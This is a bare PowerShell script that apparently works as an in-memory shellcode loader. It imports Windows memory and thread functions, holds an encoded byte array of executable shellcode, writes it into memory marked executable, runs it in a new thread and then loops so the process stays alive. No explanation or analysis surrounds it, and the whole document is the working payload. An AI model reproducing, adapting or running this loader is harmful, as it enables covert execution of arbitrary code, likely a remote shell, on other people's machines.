$L8Q = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $L8Q -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x46,0x20,0x9b,0xa4,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xc2,0x04,0x03,0x42,0x49,0xc2,0x6e,0x58,0xbd,0x80,0x91,0xa1,0x3d,0xe5,0x18,0x44,0x0c,0x25,0x7e,0x0c,0x3e,0x95,0xf4,0x40,0xb2,0x5e,0x58,0x71,0x41,0x12,0x75,0x76,0xe2,0x99,0xa3,0xb9,0xf3,0xb2,0x90,0xd8,0x77,0xc9,0xc4,0x3a,0x46,0x02,0x19,0x3a,0x8f,0x7f,0xd0,0x6e,0x58,0x0b,0x47,0x9f,0xed,0x41,0x54,0x14,0xbd,0x44,0xdc,0xc9,0x75,0x66,0xcd,0x5f,0x0e,0x31,0xcd,0x5e,0xc3,0x49,0x44,0x79,0x00,0x77,0x1e,0xf2,0xf2,0x03,0xa1,0xd2,0xcb,0xec,0x0e,0x1b,0xe4,0x1e,0x4e,0x5b,0xc2,0xc0,0x25,0x95,0x31,0x7c,0x3e,0x62,0x48,0x5a,0xcb,0x71,0xea,0x29,0x6b,0x5e,0x0b,0xfd,0xea,0x15,0x07,0x4a,0x78,0x71,0x0b,0x4d,0xad,0x09,0x37,0xc6,0x50,0xde,0xbe,0x9c,0x76,0xfa,0x9b,0x47,0x16,0x5b,0x41,0x29,0x27,0xbb,0x2a,0x96,0x8d,0xb7,0xc6,0xc3,0xbf,0x95,0x8e,0x20,0xf2,0x25,0x4e,0x2f,0x85,0x56,0x7c,0xf0,0x3d,0xf1,0xcc,0x79,0x98,0x06,0x33,0x50,0x5c,0x98,0xca,0x5b,0x9d,0xb0,0x08,0x0f,0xcd,0xaa,0xb9,0x30,0x86,0x2a,0x46,0xe5,0x33,0x2e,0xd0,0x9c,0xa5,0x0a,0x29,0xc9,0x27,0x6b,0x38,0x55,0xa1,0x8d,0x6a,0x35,0xe1,0x01,0xca,0xe5,0x41,0xf2,0xa2,0xef,0x4d,0x2d,0xd2,0x0f,0x84,0x46,0x78,0xe0,0x71,0x3e,0x14,0x99,0xdb,0xb4,0x85,0x66,0xf6,0xb0,0x85,0xed,0xf5,0x45,0x4b,0x06,0x73,0x56,0x3b,0xe6,0xce,0x04,0xed,0xf9,0xe4,0x23,0x11,0x6c,0x03,0xe2,0x46,0x18,0x09,0xd3,0xa0,0x87,0xf2,0x36,0xbb,0x0e,0x67,0xf9,0xd3,0x6e,0x67,0xf9,0x23,0x39,0xed,0xf9,0x4b,0x9d,0x55,0xaa,0x6e,0xe2,0x43,0xde,0x23,0x77,0x6c,0xb7,0x90,0xd0,0x04,0x35,0xcf,0x17,0x8b,0xc6,0x3a,0xa6,0xf7,0x10,0x02,0xdc,0x19,0xa1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ktN=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ktN.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ktN,0,0,0);for (;;){Start-sleep 60};
